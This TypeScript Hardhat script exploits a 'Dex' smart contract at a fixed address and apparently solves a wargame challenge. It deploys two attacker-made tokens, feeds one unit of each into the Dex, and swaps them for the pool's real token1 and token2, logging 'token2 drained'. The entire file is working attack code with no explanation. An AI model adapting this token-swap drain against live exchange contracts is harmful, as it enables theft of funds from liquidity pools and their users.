import { ethers } from "hardhat";
import {getContractAt} from "@nomiclabs/hardhat-ethers/internal/helpers";

async function main() {
  const dex = await ethers.getContractAt("Dex", "0xD0f6ce64ceF55e1fCE779BE23C4b96124f0497Ad");

  const token1 = await dex.token1();
  const token2 = await dex.token2();

  const BsToken = await ethers.getContractFactory("SwappableTokenTwo");

  const bsToken1 = await BsToken.deploy(dex.address, "", "", "1000");
  console.log("bsToken1 deployed at", bsToken1.address);

  let tx = await bsToken1.transfer(dex.address, "1");
  await tx.wait(1);
  console.log("bsToken1 transferred to dex");

  tx = await bsToken1["approve(address,uint256)"](dex.address, "1");
  await tx.wait(1);
  console.log("bsToken1 approved");

  tx = await dex.swap(bsToken1.address, token2, "1");
  await tx.wait(1);
  console.log("token2 drained");

  const bsToken2 = await BsToken.deploy(dex.address, "", "", "1000");
  console.log("bsToken2 deployed at", bsToken2.address);

  tx = await bsToken2.transfer(dex.address, "1");
  await tx.wait(1);
  console.log("bsToken2 transferred to dex");

  await bsToken2["approve(address,uint256)"](dex.address, "1");
  await tx.wait(1);
  console.log("bsToken2 approved");

  tx = await dex.swap(bsToken2.address, token1, "2");
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
